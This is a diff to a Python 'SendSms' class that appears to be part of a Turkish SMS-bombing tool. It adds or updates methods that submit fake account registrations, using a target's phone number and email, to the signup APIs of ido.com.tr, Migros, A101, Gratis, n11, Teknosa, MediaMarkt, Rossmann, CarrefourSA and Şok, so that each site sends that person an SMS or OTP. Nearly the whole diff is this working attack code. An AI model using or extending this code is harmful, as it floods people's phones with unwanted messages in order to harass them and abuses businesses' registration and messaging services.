@@ -715,17 +715,162 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> jimmykey.com")
         
 
-    #api.ido.com.tr
+    #api.ido.com.tr - UPDATED
     def Ido(self):
         try:
             url = "https://api.ido.com.tr:443/idows/v2/register"
             headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
-            json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
+            json={"birthDate": "24.09.1977", "captcha": "", "checkPwd": "Memati31", "code": "", "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "pwd": "Memati31", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True}
             r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.status_code == 200:
+            if r.status_code == 200 or "OTP" in r.text:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ido.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ido.com.tr")
+
+
+    #migros.com.tr
+    def Migros(self):
+        try:
+            url = "https://www.migrosonline.com:443/api/users/register"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "https://www.migrosonline.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.migrosonline.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
+            json={"email": self.mail, "password": "Memati31", "phoneNumber": self.phone, "name": "Memati", "surname": "Bas"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 or "sms" in r.text.lower():
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> migrosonline.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> migrosonline.com")
+
+
+    #a101.com.tr
+    def A101(self):
+        try:
+            url = "https://www.a101.com.tr:443/api/account/register"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "https://www.a101.com.tr", "Referer": "https://www.a101.com.tr/"}
+            json={"email": self.mail, "password": "Memati31", "phone": self.phone, "firstName": "Memati", "lastName": "Bas", "acceptTerms": True}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 or r.status_code == 201:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")
+
+
+    #gratis.com
+    def Gratis(self):
+        try:
+            url = "https://www.gratis.com:443/users/register/"
+            headers = {"Content-Type": "multipart/form-data; boundary=GratisFormBoundary", "Accept": "application/json, text/plain, */*", "User-Agent": "Gratis/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
+            data = f"--GratisFormBoundary\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--GratisFormBoundary\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--GratisFormBoundary\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--GratisFormBoundary\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\nMemati31\r\n--GratisFormBoundary\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--GratisFormBoundary\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--GratisFormBoundary--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.status_code == 202 or r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gratis.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gratis.com")
+
+
+    #n11.com
+    def N11(self):
+        try:
+            url = "https://www.n11.com:443/kullanici-islemleri/uye-ol"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.n11.com", "Referer": "https://www.n11.com/"}
+            data = {"email": self.mail, "password": "Memati31", "phoneNumber": self.phone, "firstName": "Memati", "lastName": "Bas", "acceptContract": "true"}
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> n11.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> n11.com")
+
+
+
+    #teknosa.com
+    def Teknosa(self):
+        try:
+            url = "https://www.teknosa.com:443/api/account/register"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.teknosa.com", "Referer": "https://www.teknosa.com/"}
+            json={"email": self.mail, "password": "Memati31", "phoneNumber": self.phone, "name": "Memati", "surname": "Bas", "kvkkAccepted": True}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 or r.status_code == 201:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> teknosa.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> teknosa.com")
+
+
+    #mediamarkt.com.tr
+    def MediaMarkt(self):
+        try:
+            url = "https://www.mediamarkt.com.tr:443/api/users/register"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.mediamarkt.com.tr", "Referer": "https://www.mediamarkt.com.tr/"}
+            json={"email": self.mail, "password": "Memati31", "mobile": self.phone, "firstName": "Memati", "lastName": "Bas"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 or r.status_code == 201:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mediamarkt.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mediamarkt.com.tr")
+
+
+    #rossmann.com.tr
+    def Rossmann(self):
+        try:
+            url = "https://www.rossmann.com.tr:443/users/register/"
+            headers = {"Content-Type": "multipart/form-data; boundary=RossmannBoundary", "Accept": "application/json", "User-Agent": "Rossmann/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
+            data = f"--RossmannBoundary\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--RossmannBoundary\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--RossmannBoundary\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--RossmannBoundary\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\nMemati31\r\n--RossmannBoundary\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--RossmannBoundary\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--RossmannBoundary--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.status_code == 202 or r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rossmann.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rossmann.com.tr")
+
+
+    #carrefoursa.com
+    def CarrefourSA(self):
+        try:
+            url = "https://www.carrefoursa.com:443/api/user/register"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.carrefoursa.com", "Referer": "https://www.carrefoursa.com/"}
+            json={"email": self.mail, "password": "Memati31", "phoneNumber": f"0{self.phone}", "firstName": "Memati", "lastName": "Bas", "kvkk": True}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 or r.status_code == 201:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> carrefoursa.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> carrefoursa.com")
+
+
+    #sok.com.tr
+    def Sok(self):
+        try:
+            url = "https://www.sokmarket.com.tr:443/api/users/register"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.sokmarket.com.tr", "Referer": "https://www.sokmarket.com.tr/"}
+            json={"email": self.mail, "password": "Memati31", "phone": self.phone, "name": "Memati", "surname": "Bas", "acceptAgreement": True}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 or r.status_code == 201:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sokmarket.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sokmarket.com.tr")
